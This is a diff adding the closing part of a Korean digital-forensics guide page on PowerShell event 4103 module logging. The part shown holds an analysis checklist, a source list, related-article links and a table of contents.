+<ol><li><code>ContextInfo</code>를 파싱했는가 → 필요한 값은 전부 그 문자열 안에 있다</li><li><code>Payload</code>의 <code>ParameterBinding</code>을 봤는가 → 여기에 실제 인자 값이 있다</li><li>노이즈를 제외했는가 → <code>Out-Default</code>/<code>Write-Host</code>/<code>Format-*</code></li><li><code>Host Application</code>을 확인했는가 → 명령행, 원격 여부, 임베드 여부가 한 줄에 다 있다</li><li><code>Runspace ID</code> + <code>Sequence Number</code>로 정렬했는가 → 시각만으로는 순서가 틀어진다</li><li>원하는 커맨드릿이 없는가 → <code>ModuleNames</code>가 좁게 설정됐을 수 있다</li><li>4103이 아예 없는가 → 4104 → <code>Windows PowerShell.evtx</code> 400/800 → 전사 파일 → Sysmon 1 순서</li><li>인자 값에 URL/IP가 있는가 → pcap과 Sysmon 3으로 실제 통신을 확인한다</li><li>문자열 검색이 편하면 CSV로 내려 <code>Select-String</code>을 쓴다(<a href="./powershell-select-string.html">FOR-0121</a>)</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-023 — Microsoft Learn, about_Logging_Windows: 모듈 로깅(4103) 활성 정책, <code>ModuleLogging</code>·<code>ModuleNames</code> 레지스트리 구조, 스크립트 블록 로깅과의 차이</li><li>SRC-016 — MITRE ATT&amp;CK T1059.001 PowerShell: 원격 실행·다운그레이드·다운로드 실행 등 관측되는 실행 형태</li><li>SRC-022 — Microsoft Learn, Advanced security audit policy settings: 대조에 쓰는 4688·4624의 정의와 명령행 감사가 기본 비활성인 점</li><li><code>ContextInfo</code>의 항목 이름과 순서는 PowerShell 버전 및 OS 표시 언어에 따라 달라질 수 있다. 파싱 전에 실제 이벤트의 <code>ContextInfo</code> 원문을 한 번 출력해 확인할 것</li><li><code>Payload</code>의 <code>CommandInvocation</code> / <code>ParameterBinding</code> 표기는 버전에 따라 세부 형식이 다를 수 있으므로, 정규식은 실제 로그 한 건으로 먼저 검증할 것</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./powershell-4104-scriptblock.html">
+    <span class="rel-id">FOR-0097 · Event Log</span>
+    PowerShell 4104 ScriptBlock 로깅: 쪼개진 스크립트 재조립과 난독화 해제
+  </a>
+  <a class="related-item" href="./powershell-select-string.html">
+    <span class="rel-id">FOR-0121 · 로그/Regex</span>
+    PowerShell Select-String으로 로그 검색하기 (Windows용 grep)
+  </a>
+  <a class="related-item" href="./event-4688-process-creation.html">
+    <span class="rel-id">FOR-0088 · Event Log</span>
+    Event ID 4688 프로세스 생성: CommandLine 과 부모-자식 체인 재구성
+  </a>
+  <a class="related-item" href="./evtx-analysis-order.html">
+    <span class="rel-id">FOR-0081 · Event Log</span>
+    EVTX 분석 순서: winevt\Logs 채널 우선순위와 30초 트리아지
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./powershell-4104-scriptblock.html"><span class="rel-id">← FOR-0097</span>PowerShell 4104 ScriptBlock 로깅: 쪼개진 스크립트 재조립과 난독화 해제</a>
+<a class="related-item" href="./sysmon-event-1-process-create.html"><span class="rel-id">FOR-0099 →</span>Sysmon Event ID 1 ProcessCreate: ProcessGuid로 프로세스 계보 복원</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-eventdata는-세-개뿐이다">1단계 — EventData는 세 개뿐이다</a></li>
+<li class="toc-l3"><a href="#2단계-contextinfo-항목표">2단계 — ContextInfo 항목표</a></li>
+<li class="toc-l3"><a href="#3단계-payload에서-인자-값-복원">3단계 — Payload에서 인자 값 복원</a></li>
+<li class="toc-l3"><a href="#4단계-4104와의-역할-구분">4단계 — 4104와의 역할 구분</a></li>
+<li class="toc-l3"><a href="#5단계-원격-실행-판정">5단계 — 원격 실행 판정</a></li>
+<li class="toc-l3"><a href="#6단계-노이즈-필터-필수">6단계 — 노이즈 필터 (필수)</a></li>
+<li class="toc-l3"><a href="#7단계-활성-여부와-꺼져-있을-때의-대안">7단계 — 활성 여부와 꺼져 있을 때의 대안</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
